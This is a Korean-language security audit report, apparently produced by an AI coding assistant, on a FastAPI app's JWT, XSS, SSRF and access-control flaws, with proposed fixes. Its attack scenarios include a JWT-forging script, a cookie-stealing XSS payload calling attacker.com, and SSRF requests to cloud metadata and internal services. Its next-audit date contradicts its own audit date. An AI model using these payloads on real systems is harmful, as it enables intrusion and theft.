# 국정원 8대 보안취약점 & OWASP Top 10 종합 감사 보고서

**감사 일자**: 2025-12-31
**감사 범위**: 국정원 8대 보안취약점 + OWASP Top 10 (2021) 전체 점검
**심각도 분류**: CRITICAL / HIGH / MEDIUM / LOW

---

## 📊 종합 요약

### 심각도별 통계

| 심각도 | 개수 | 즉시 조치 필요 |
|--------|------|----------------|
| 🔴 CRITICAL | 2개 | ✅ 즉시 |
| 🟠 HIGH | 3개 | ✅ 1일 내 |
| 🟡 MEDIUM | 5개 | ⚠️ 1주일 내 |
| 🟢 LOW | 2개 | 선택 |
| **합계** | **12개** | **10개 우선 수정** |

### 프레임워크별 통계

#### 국정원 8대 보안취약점
| # | 항목 | 상태 | 심각도 |
|---|------|------|--------|
| 1 | SQL Injection | ✅ 안전 | N/A |
| 2 | Cross-Site Scripting (XSS) | ❌ 취약 | HIGH |
| 3 | OS Command Injection | ✅ 안전 | N/A |
| 4 | 파일 업로드 | ✅ 안전 | N/A |
| 5 | 파일 다운로드 | ✅ 안전 | N/A |
| 6 | 디렉터리 인덱싱 | ✅ 안전 | N/A |
| 7 | 불충분한 인증/인가 | ❌ 취약 | CRITICAL |
| 8 | 취약한 패스워드 복구 | ❌ 취약 | MEDIUM |

#### OWASP Top 10 (2021)
| # | 항목 | 상태 | 심각도 |
|---|------|------|--------|
| A01 | Broken Access Control | ❌ 취약 | CRITICAL |
| A02 | Cryptographic Failures | ⚠️ 부분적 | CRITICAL |
| A03 | Injection | ⚠️ 부분적 | HIGH |
| A04 | Insecure Design | ❌ 취약 | MEDIUM |
| A05 | Security Misconfiguration | ❌ 취약 | HIGH |
| A06 | Vulnerable Components | ⚠️ 미점검 | - |
| A07 | Authentication Failures | ❌ 취약 | CRITICAL |
| A08 | Data Integrity Failures | ✅ 안전 | N/A |
| A09 | Logging Failures | ✅ 양호 | N/A |
| A10 | SSRF | ❌ 취약 | HIGH |

---

## 🔴 CRITICAL - 즉시 수정 필수

### 1. JWT SECRET_KEY 기본값 취약점 ⚠️ CRITICAL

**관련**: 국정원 #7, OWASP A07
**파일**:
- `src/auth/utils.py:17`
- `src/auth/password_reset.py:12`

**문제**:
```python
# src/auth/utils.py:17
SECRET_KEY = os.getenv("JWT_SECRET_KEY", "your-secret-key-change-in-production")

# src/auth/password_reset.py:12
SECRET_KEY = os.getenv("JWT_SECRET_KEY", "your-secret-key-change-in-production")
```

- 환경 변수 미설정 시 공개된 기본값 사용
- **전체 인증 시스템 무력화** 가능
- 공격자가 임의의 JWT 토큰 위조 가능

**공격 시나리오**:
```python
import jwt
SECRET_KEY = "your-secret-key-change-in-production"
admin_token = jwt.encode({
    "user_id": "admin",
    "role": "admin",
    "exp": datetime.utcnow() + timedelta(days=1)
}, SECRET_KEY, algorithm="HS256")
# 이 토큰으로 전체 시스템 장악 가능
```

**영향**:
- 모든 사용자 계정 탈취 가능
- 관리자 권한 획득 가능
- 전체 시스템 장악 가능
- 데이터 유출/변조/삭제 가능

**수정 방법**:
```python
# src/auth/utils.py, src/auth/password_reset.py 모두 수정
SECRET_KEY = os.getenv("JWT_SECRET_KEY")
if not SECRET_KEY:
    raise ValueError("JWT_SECRET_KEY environment variable must be set")
```

**.env.example 추가**:
```bash
# JWT Secret Key (REQUIRED - NEVER use default in production!)
# Generate with: openssl rand -hex 32
JWT_SECRET_KEY=your-very-strong-random-secret-key-here-CHANGE-THIS
```

**실제 .env 설정**:
```bash
openssl rand -hex 32 > /tmp/secret.txt
# Copy generated secret to .env file
```

---

### 2. Broken Access Control - 인증 우회 가능 ⚠️ CRITICAL

**관련**: 국정원 #7, OWASP A01, A07
**파일**: `src/auth/middleware.py:91-112`, `src/auth/utils.py:222-240`

**문제**:
1. **중복된 require_admin 구현**:
   - `auth/middleware.py`에 하나
   - `auth/utils.py`에 하나
   - 서로 다른 로직으로 일관성 부족

2. **JWT 토큰 블랙리스트 미구현**:
   - 로그아웃해도 토큰이 계속 유효
   - 토큰 탈취 시 로그아웃으로 무효화 불가능
   - 계정 탈취 후 로그아웃해도 공격 지속

**영향**:
- 로그아웃한 사용자의 토큰으로 계속 접근 가능
- 세션 탈취 공격에 취약
- 계정 탈취 시 복구 불가능

**수정 방법**:

**1) require_admin 통일**:
```python
# 하나만 남기고 다른 것은 제거
# src/auth/middleware.py의 구현을 사용하고
# src/auth/utils.py의 중복 구현 삭제
```

**2) JWT 토큰 블랙리스트 구현**:
```python
# src/auth/service.py - logout 메서드 수정
async def logout(self, token: str) -> bool:
    """로그아웃 - 토큰 블랙리스트 추가"""
    try:
        payload = jwt.decode(token, SECRET_KEY, verify_exp=False)
        exp = payload.get("exp")

        if exp:
            # 만료 시간까지만 블랙리스트에 보관
            ttl = exp - time.time()
            if ttl > 0:
                self.redis.setex(
                    f"blacklist:token:{token}",
                    int(ttl),
                    "1"
                )

        return True
    except Exception as e:
        logger.error(f"Logout error: {e}")
        return False

# src/auth/utils.py - verify_token 메서드 수정
def verify_token(token: str, expected_type: str = "access", verify_exp: bool = True):
    """토큰 검증 - 블랙리스트 확인 추가"""
    # 블랙리스트 확인
    from .service import AuthService
    if redis_client.exists(f"blacklist:token:{token}"):
        raise HTTPException(
            status_code=401,
            detail="Token has been revoked"
        )

    # 기존 검증 로직
    payload = jwt.decode(token, SECRET_KEY, verify_exp=verify_exp)
    # ... 나머지 검증
```

---

## 🟠 HIGH - 1일 내 수정

### 3. Cross-Site Scripting (XSS) 취약점 ⚠️ HIGH

**관련**: 국정원 #2, OWASP A03
**파일**: `src/web_server.py:647-682`, `src/web_server.py:196-213`

**문제 1: XSS 검증 순서 오류**
```python
@validator('question')
def sanitize_question(cls, v):
    # Line 662: HTML escape 먼저 실행
    sanitized = html.escape(v)

    # Line 665-680: 위험한 패턴 검사 (escape 후라서 무의미)
    dangerous_patterns = [r'<script[^>]*>', ...]
    for pattern in dangerous_patterns:
        if re.search(pattern, sanitized, re.IGNORECASE):
            raise ValueError("...")  # 절대 매치 안됨!
```

- `html.escape()`가 `<script>` → `&lt;script&gt;`로 변환
- 변환 후 패턴 검사는 의미 없음

**문제 2: CSP unsafe-inline/unsafe-eval**
```python
# Line 210
"script-src 'self' 'unsafe-inline' 'unsafe-eval' ..."
```

- `'unsafe-inline'`: 인라인 스크립트 허용 → XSS 공격 가능
- `'unsafe-eval'`: eval() 함수 허용 → 코드 인젝션 가능
- CSP의 주 목적(XSS 방어) 무력화

**공격 시나리오**:
```html
<!-- 사용자 입력에 포함 -->
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

**영향**:
- 사용자 세션 탈취
- 악성 스크립트 실행
- 민감 정보 유출
- 피싱 공격

**수정 방법**:

**1) XSS 검증 순서 수정**:
```python
@validator('question')
def sanitize_question(cls, v):
    import re, html

    if not v or not v.strip():
        raise ValueError("질문을 입력해주세요.")

    if len(v) > 10000:
        raise ValueError("질문이 너무 깁니다.")

    # 1. 먼저 위험한 패턴 검사 (escape 전에)
    dangerous_patterns = [
        r'<script[^>]*>',
        r'javascript:',
        r'onerror\s*=',
        r'onclick\s*=',
        r'onload\s*=',
        r'<iframe',
        r'<object',
        r'<embed',
        r'eval\s*\(',
        r'expression\s*\('
    ]

    for pattern in dangerous_patterns:
        if re.search(pattern, v, re.IGNORECASE):  # 원본에서 검사!
            raise ValueError("입력에 허용되지 않는 패턴이 포함되어 있습니다.")

    # 2. 그 다음 HTML escape
    sanitized = html.escape(v)

    return sanitized
```

**2) CSP nonce 기반으로 변경**:
```python
import secrets

# 미들웨어에서 nonce 생성
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    # Nonce 생성
    nonce = secrets.token_urlsafe(16)
    request.state.nonce = nonce

    response = await call_next(request)

    # CSP with nonce
    response.headers["Content-Security-Policy"] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net; "
        f"style-src 'self' 'nonce-{nonce}' https://fonts.googleapis.com; "
        f"img-src 'self' data: https:; "
        f"font-src 'self' https://fonts.gstatic.com; "
        f"connect-src 'self'; "
        f"frame-ancestors 'none'; "
        f"base-uri 'self'; "
        f"form-action 'self'"
    )

    return response

# HTML 템플릿에서 사용
# <script nonce="{{ request.state.nonce }}">...</script>
```

---

### 4. Server-Side Request Forgery (SSRF) ⚠️ HIGH

**관련**: OWASP A10
**파일**: `src/auth/webhook_service.py:292-297`

**문제**:
```python
async def _deliver_webhook(self, webhook: Webhook, ...):
    # Line 292-297: 사용자가 제공한 URL로 HTTP 요청
    response = await self.http_client.post(
        webhook.url,  # 검증 없음!
        content=payload_json,
        headers=headers,
        timeout=webhook.timeout_seconds
    )
```

- 사용자가 임의의 URL로 웹훅 생성 가능
- 내부 네트워크 주소로 요청 가능
- 클라우드 메타데이터 엔드포인트 접근 가능

**공격 시나리오**:
```python
# 공격자가 웹훅 생성
POST /api/webhooks
{
    "name": "attack",
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "events": ["USER_LOGIN"]
}

# 또는 내부 서비스 스캔
{
    "url": "http://localhost:6379/",  # Redis
    "url": "http://localhost:5432/",  # PostgreSQL
    "url": "http://192.168.1.100/admin",  # 내부 관리 페이지
}
```

**영향**:
- 내부 네트워크 스캔 가능
- 내부 서비스 접근 (Redis, DB, etc.)
- AWS/GCP/Azure 메타데이터 유출
- 방화벽 우회
- 내부 API 호출

**수정 방법**:
```python
from urllib.parse import urlparse
import ipaddress

def is_safe_url(url: str) -> bool:
    """SSRF 방지를 위한 URL 검증

    Args:
        url: 검증할 URL

    Returns:
        안전한 URL 여부

    Raises:
        ValueError: 위험한 URL인 경우
    """
    try:
        parsed = urlparse(url)

        # 1. 프로토콜 검증 (http/https만 허용)
        if parsed.scheme not in ['http', 'https']:
            raise ValueError(f"허용되지 않는 프로토콜: {parsed.scheme}")

        # 2. 호스트 추출
        hostname = parsed.hostname
        if not hostname:
            raise ValueError("호스트명이 없습니다")

        # 3. IP 주소인 경우 검증
        try:
            ip = ipaddress.ip_address(hostname)

            # 내부 IP 차단
            if ip.is_private or ip.is_loopback or ip.is_link_local:
                raise ValueError(f"내부 IP 주소는 허용되지 않습니다: {hostname}")

            # AWS 메타데이터 IP 차단
            if str(ip) == "169.254.169.254":
                raise ValueError("AWS 메타데이터 접근 차단")

        except ValueError:
            # 도메인명인 경우
            # 차단할 도메인 패턴
            blocked_patterns = [
                'localhost',
                '127.0.0.1',
                '0.0.0.0',
                '169.254.169.254',
                'metadata.google.internal',
                '.local',
                '.internal'
            ]

            hostname_lower = hostname.lower()
            for pattern in blocked_patterns:
                if pattern in hostname_lower:
                    raise ValueError(f"차단된 호스트: {hostname}")

        # 4. 포트 검증 (일반적인 웹 포트만 허용)
        if parsed.port and parsed.port not in [80, 443, 8080, 8443]:
            raise ValueError(f"허용되지 않는 포트: {parsed.port}")

        return True

    except Exception as e:
        raise ValueError(f"URL 검증 실패: {e}")


async def create_webhook(self, webhook_data: WebhookCreate, user_id: str) -> Webhook:
    """웹훅 생성 - URL 검증 추가"""

    # URL 안전성 검증
    try:
        is_safe_url(webhook_data.url)
    except ValueError as e:
        raise HTTPException(
            status_code=400,
            detail=f"웹훅 URL이 안전하지 않습니다: {e}"
        )

    # 기존 로직
    webhook_id = str(uuid.uuid4())
    # ...
```

**추가 보안 조치**:
```python
# httpx 클라이언트에 DNS 리졸브 후 재검증 추가
class SafeHTTPTransport(httpx.AsyncHTTPTransport):
    async def handle_async_request(self, request):
        # DNS 리졸브 후 IP 재검증
        url = str(request.url)
        parsed = urlparse(url)

        # IP로 리졸브된 주소 검증
        import socket
        try:
            resolved_ip = socket.gethostbyname(parsed.hostname)
            is_safe_url(f"http://{resolved_ip}")
        except:
            raise ValueError("DNS 리졸브 실패 또는 위험한 IP")

        return await super().handle_async_request(request)

# WebhookService.__init__에서 사용
self.http_client = httpx.AsyncClient(
    transport=SafeHTTPTransport(),
    timeout=httpx.Timeout(60.0),
    limits=httpx.Limits(max_connections=100)
)
```

---

### 5. Security Misconfiguration - 보안 설정 오류 ⚠️ HIGH

**관련**: OWASP A05
**파일**: `src/web_server.py`, `src/config/production.py`

**문제 1: HTTPS 강제 없음**
- `Strict-Transport-Security` 헤더 없음
- HTTP → HTTPS 리다이렉트 없음
- Man-in-the-Middle 공격 가능

**문제 2: CORS 과도한 권한**
```python
# src/web_server.py:231
allow_headers=["*"]  # 모든 헤더 허용
```

**수정 방법**:

**1) HSTS 및 HTTPS 강제**:
```python
@app.middleware("http")
async def security_headers(request: Request, call_next):
    # HTTPS 강제 (프로덕션 환경)
    if not request.url.scheme == "https" and os.getenv("ENV") == "production":
        https_url = str(request.url).replace("http://", "https://")
        return RedirectResponse(url=https_url, status_code=301)

    response = await call_next(request)

    # HSTS 헤더
    if request.url.scheme == "https":
        response.headers["Strict-Transport-Security"] = (
            "max-age=31536000; includeSubDomains; preload"
        )

    return response
```

**2) CORS 제한**:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "PATCH"],
    allow_headers=[
        "Content-Type",
        "Authorization",
        "X-Requested-With",
        "Accept",
        "Origin"
    ],  # 필요한 헤더만 명시
    expose_headers=["Content-Length", "X-Request-ID"]
)
```

---

## 🟡 MEDIUM - 1주일 내 수정

### 6. 계정 열거 (Account Enumeration) ⚠️ MEDIUM

**관련**: 국정원 #8, OWASP A04
**파일**: `src/auth/service.py:418-423`, `src/routers/auth.py:356-360`

**문제**:
```python
# src/auth/service.py:418-423
user_id = self.redis.get(f"user:email:{email}")
if not user_id:
    # 주석: "보안: 이메일이 존재하지 않아도 성공 메시지 반환"
    # 하지만 실제로는 ValueError 발생!
    raise ValueError("사용자를 찾을 수 없습니다")

# src/routers/auth.py:356-360
except ValueError as e:
    raise HTTPException(
        status_code=status.HTTP_400_BAD_REQUEST,
        detail=str(e)  # "사용자를 찾을 수 없습니다" 노출
    )
```

**영향**:
- 공격자가 등록된 이메일 확인 가능
- 타겟 계정 식별 후 집중 공격 가능
- 개인정보 유출 (이메일 존재 여부)

**수정 방법**:
```python
# src/auth/service.py
async def request_password_reset(self, email: str) -> str:
    """비밀번호 재설정 요청 - 계정 열거 방지"""
    from .password_reset import create_password_reset_token

    # 1. 이메일로 사용자 조회
    user_id = self.redis.get(f"user:email:{email}")

    # 2. 사용자가 존재하지 않아도 동일한 응답 시간 유지
    if not user_id:
        # 타이밍 공격 방지: 동일한 처리 시간 소요
        import asyncio
        await asyncio.sleep(0.1)  # 토큰 생성과 유사한 시간

        # 로그에만 기록 (응답은 성공)
        SecurityLogger.log_event(
            event_type="PASSWORD_RESET_INVALID_EMAIL",
            level="WARNING",
            email=email
        )

        # 가짜 토큰 반환 (실제로는 무효한 토큰)
        return "invalid-token-for-timing-attack-prevention"

    # 3. 실제 사용자인 경우 토큰 생성
    reset_token = create_password_reset_token(email)

    user_id_str = user_id.decode() if isinstance(user_id, bytes) else user_id
    SecurityLogger.log_event(
        event_type="PASSWORD_RESET_REQUESTED",
        level="INFO",
        user_id=user_id_str,
        email=email
    )

    return reset_token

# src/routers/auth.py
@router.post("/password-reset/request")
async def request_password_reset(reset_request: PasswordReset, ...):
    """비밀번호 재설정 요청 - 항상 성공 응답"""

    auth_service = AuthService(request.app.state.cache_manager.redis)

    # ValueError 발생하지 않음 - 항상 토큰 반환
    reset_token = await auth_service.request_password_reset(reset_request.email)

    # 실제 환경: 이메일로 전송, 여기서는 응답에 포함
    # 사용자 존재 여부와 무관하게 동일한 메시지
    return {
        "message": "비밀번호 재설정 링크가 이메일로 전송되었습니다. 이메일을 확인해주세요.",
        "reset_token": reset_token  # 프로덕션: 제거, 이메일로만 전송
    }
```

---

### 7. X-Forwarded-For 헤더 스푸핑 ⚠️ MEDIUM

**관련**: OWASP A05
**파일**: `src/middleware/rate_limiter_redis.py:166-168`

**문제**:
```python
def _get_client_id(self, request: Request) -> str:
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()  # 헤더를 무조건 신뢰!
```

- 공격자가 임의의 IP로 위장 가능
- Rate limiting 우회 가능

**수정 방법**:
```python
from ipaddress import ip_address, ip_network

# 신뢰할 수 있는 프록시 IP 목록
TRUSTED_PROXIES = [
    ip_network("10.0.0.0/8"),
    ip_network("172.16.0.0/12"),
    ip_network("192.168.0.0/16"),
    # 클라우드 환경의 로드밸런서 IP 추가
]

def _is_trusted_proxy(ip: str) -> bool:
    """프록시 IP가 신뢰할 수 있는지 확인"""
    try:
        ip_obj = ip_address(ip)
        return any(ip_obj in network for network in TRUSTED_PROXIES)
    except:
        return False

def _get_client_id(self, request: Request) -> str:
    """클라이언트 ID 추출 - 프록시 검증 추가"""
    # 직접 연결된 IP
    direct_ip = request.client.host if request.client else "unknown"

    # 신뢰할 수 있는 프록시에서 온 경우에만 X-Forwarded-For 사용
    if _is_trusted_proxy(direct_ip):
        forwarded = request.headers.get("X-Forwarded-For")
        if forwarded:
            # 첫 번째 IP (실제 클라이언트)
            client_ip = forwarded.split(",")[0].strip()

            # IP 형식 검증
            try:
                ip_address(client_ip)
                return client_ip
            except:
                # 잘못된 형식이면 직접 IP 사용
                pass

    return direct_ip
```

---

### 8. .env.example에 JWT_SECRET_KEY 누락 ⚠️ MEDIUM

**관련**: OWASP A05
**파일**: `.env.example`

**문제**:
- JWT_SECRET_KEY 항목이 예제 파일에 없음
- 개발자가 설정 필요성을 모를 수 있음

**수정 방법**:
```bash
# .env.example에 추가

# ==============================================
# Security - JWT Authentication (REQUIRED!)
# ==============================================
# CRITICAL: Generate a strong random secret key
# NEVER use the default value in production!
# Generate with: openssl rand -hex 32
JWT_SECRET_KEY=your-very-strong-random-secret-key-here-CHANGE-THIS-IN-PRODUCTION

# JWT Token Expiration
JWT_ACCESS_TOKEN_EXPIRE_MINUTES=30
JWT_REFRESH_TOKEN_EXPIRE_DAYS=7
JWT_ALGORITHM=HS256
```

---

### 9-10. 기타 보안 개선 사항 ⚠️ MEDIUM

**9) 비밀번호 정책 강화**:
```python
def validate_password_strength(password: str) -> bool:
    """비밀번호 강도 검증"""
    if len(password) < 12:
        raise ValueError("비밀번호는 최소 12자 이상이어야 합니다")

    if not re.search(r'[A-Z]', password):
        raise ValueError("대문자를 포함해야 합니다")

    if not re.search(r'[a-z]', password):
        raise ValueError("소문자를 포함해야 합니다")

    if not re.search(r'[0-9]', password):
        raise ValueError("숫자를 포함해야 합니다")

    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        raise ValueError("특수문자를 포함해야 합니다")

    # 자주 사용되는 비밀번호 차단
    common_passwords = ['password123', 'admin123', 'qwerty123', ...]
    if password.lower() in common_passwords:
        raise ValueError("자주 사용되는 비밀번호는 사용할 수 없습니다")

    return True
```

**10) 세션 타임아웃**:
```python
# 비활동 타임아웃: 30분
INACTIVE_SESSION_TIMEOUT = 30 * 60

# 절대 타임아웃: 24시간
ABSOLUTE_SESSION_TIMEOUT = 24 * 60 * 60

# JWT 토큰에 last_activity 추가
def verify_session_timeout(payload: dict):
    last_activity = payload.get("last_activity")
    if last_activity:
        inactive_time = time.time() - last_activity
        if inactive_time > INACTIVE_SESSION_TIMEOUT:
            raise HTTPException(401, "세션이 만료되었습니다")
```

---

## 🟢 LOW - 선택적 개선

### 11. 2단계 인증 (2FA) 미구현

**권장 구현**:
- TOTP 기반 2단계 인증 추가
- 관리자 계정은 2FA 필수
- pyotp 라이브러리 사용

### 12. 감사 로깅 개선

**권장 구현**:
- 모든 인증 실패 로깅 (이미 구현됨)
- 관리자 작업 상세 로그
- 민감한 작업 추적 (비밀번호 변경, 권한 변경 등)

---

## ✅ 양호한 보안 관행

다음 영역은 잘 구현되어 있습니다:

### 1. **파일 업로드 보안** ✅
- Path Traversal 방어 (`validate_filename`)
- Magic Bytes 검증 (`validate_file_content`)
- 파일 크기 제한
- 파일명 화이트리스트 검증

### 2. **명령어 인젝션 방어** ✅
- `subprocess.run()` 리스트 형식 사용
- `shell=True` 사용 안 함
- 사용자 입력 직접 포함 안 함

### 3. **비밀번호 암호화** ✅
- bcrypt 해싱 사용
- 솔트 자동 생성
- 검증 함수 안전

### 4. **보안 로깅** ✅
- SecurityLogger 구현
- 민감 정보 마스킹
- 구조화된 로그 형식
- 이벤트 추적

### 5. **Rate Limiting** ✅
- Redis 기반 구현
- 엔드포인트별 제한
- 비밀번호 재설정: 3회/1시간
- API: 100회/1분

### 6. **보안 헤더** ✅
- X-Frame-Options: DENY
- X-Content-Type-Options: nosniff
- X-XSS-Protection: 1; mode=block
- (CSP는 수정 필요)

### 7. **Path Traversal 방어** ✅
- 파일 다운로드 경로 검증
- `Path.name` 사용으로 디렉터리 제거
- 관리자 권한 확인

### 8. **디렉터리 인덱싱 비활성화** ✅
- StaticFiles에 `html=True` 미사용
- 디렉터리 목록 노출 방지

---

## 🎯 우선순위별 수정 계획

### Phase 1: 즉시 (오늘)
1. ✅ **JWT SECRET_KEY 기본값 제거** (CRITICAL)
   - `src/auth/utils.py:17` 수정
   - `src/auth/password_reset.py:12` 수정
   - 환경 변수 필수화
   - 강력한 랜덤 키 생성 및 설정

2. ✅ **JWT 토큰 블랙리스트 구현** (CRITICAL)
   - `src/auth/service.py` logout 메서드 수정
   - `src/auth/utils.py` verify_token 수정
   - Redis 블랙리스트 저장

3. ✅ **require_admin 중복 제거** (CRITICAL)
   - 하나의 구현만 유지
   - 모든 참조 통일

### Phase 2: 1일 내
4. ✅ **XSS 검증 순서 수정** (HIGH)
   - `src/web_server.py:647-682` 수정
   - 패턴 검사 → HTML escape 순서로 변경

5. ✅ **SSRF 방지 구현** (HIGH)
   - `src/auth/webhook_service.py` URL 검증 추가
   - 내부 IP/도메인 차단
   - DNS 재검증

6. ✅ **CSP 개선** (HIGH)
   - nonce 기반 CSP 구현
   - unsafe-inline/unsafe-eval 제거

### Phase 3: 1주일 내
7. ✅ **계정 열거 방지** (MEDIUM)
   - 비밀번호 재설정 응답 통일
   - 타이밍 공격 방지

8. ✅ **X-Forwarded-For 검증** (MEDIUM)
   - 신뢰할 수 있는 프록시만 허용

9. ✅ **HTTPS 강제 및 HSTS** (MEDIUM)
   - Strict-Transport-Security 헤더
   - HTTPS 리다이렉트

10. ✅ **CORS 헤더 제한** (MEDIUM)
    - 필요한 헤더만 명시

11. ✅ **.env.example 업데이트** (MEDIUM)
    - JWT_SECRET_KEY 항목 추가
    - 생성 방법 가이드

### Phase 4: 선택 (2주일 내)
12. ⚠️ **비밀번호 정책 강화** (LOW)
    - 최소 12자, 복잡도 요구사항
    - 자주 사용되는 비밀번호 차단

13. ⚠️ **2FA 구현** (LOW)
    - TOTP 기반 2단계 인증
    - 관리자 필수화

14. ⚠️ **세션 타임아웃** (LOW)
    - 비활동 타임아웃: 30분
    - 절대 타임아웃: 24시간

---

## 🔍 테스트 및 검증 권장사항

### 1. 자동화 보안 스캔
```bash
# Python 패키지 취약점 스캔
pip install safety
safety check

# 정적 보안 분석
pip install bandit
bandit -r src/

# 코드 품질 및 보안 패턴
pip install semgrep
semgrep --config=auto src/
```

### 2. 침투 테스트
- **JWT 토큰 위조 시도**: 기본 SECRET_KEY로 토큰 생성 시도
- **XSS 공격 테스트**: 다양한 XSS 페이로드 입력
- **SSRF 공격 테스트**: 내부 IP/메타데이터 엔드포인트 접근 시도
- **Rate Limiting 테스트**: 제한 초과 요청 시도
- **계정 열거 테스트**: 존재/비존재 이메일 응답 비교

### 3. 통합 테스트
```python
# tests/security/test_authentication.py
def test_jwt_requires_env_variable():
    """JWT_SECRET_KEY 환경 변수 필수 확인"""
    with pytest.raises(ValueError):
        # JWT_SECRET_KEY 없이 앱 시작
        pass

def test_logout_invalidates_token():
    """로그아웃 후 토큰 무효화 확인"""
    token = login()
    logout(token)
    assert verify_token(token) is None

def test_ssrf_prevention():
    """SSRF 방지 확인"""
    response = create_webhook(url="http://169.254.169.254/")
    assert response.status_code == 400

def test_xss_prevention():
    """XSS 방지 확인"""
    response = query(question="<script>alert('xss')</script>")
    assert "<script>" not in response.text
    assert "&lt;script&gt;" in response.text
```

### 4. 수동 검증
```bash
# 1. JWT SECRET_KEY 확인
grep -r "your-secret-key-change-in-production" src/
# 결과 없어야 함

# 2. 블랙리스트 동작 확인
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/auth/logout
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/documents
# 401 Unauthorized 반환되어야 함

# 3. SSRF 방지 확인
curl -X POST http://localhost:8000/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url":"http://localhost:6379","name":"test","events":["USER_LOGIN"]}'
# 400 Bad Request 반환되어야 함
```

---

## 📞 보고 및 지원

### 보안 취약점 발견 시
1. **즉시 보안팀에 보고** (이메일/Slack)
2. **공개 이슈 트래커에 게시 금지**
3. **패치 적용 후 공개**

### 다음 감사 예정일
**2025-06-30** (6개월 후)

---

## 📋 체크리스트

수정 완료 시 체크:

### CRITICAL (즉시)
- [ ] JWT SECRET_KEY 기본값 제거 및 필수화
- [ ] 강력한 SECRET_KEY 생성 및 .env 설정
- [ ] JWT 토큰 블랙리스트 구현
- [ ] require_admin 중복 제거

### HIGH (1일 내)
- [ ] XSS 검증 순서 수정
- [ ] CSP nonce 기반으로 개선
- [ ] SSRF URL 검증 구현
- [ ] HTTPS 강제 및 HSTS 헤더

### MEDIUM (1주일 내)
- [ ] 계정 열거 방지
- [ ] X-Forwarded-For 검증
- [ ] CORS 헤더 제한
- [ ] .env.example 업데이트
- [ ] 비밀번호 정책 강화

### 검증
- [ ] 자동화 보안 스캔 실행
- [ ] 침투 테스트 수행
- [ ] 통합 테스트 작성 및 실행
- [ ] 수동 검증 완료

---

**보고서 작성**: Claude Code Security Audit
**검토 프레임워크**: 국정원 8대 보안취약점 + OWASP Top 10 (2021)
**다음 감사 예정일**: 2025-06-30

**전체 평가**: ⚠️ **즉시 조치 필요**
**주요 위험**: JWT 인증 우회, SSRF, XSS
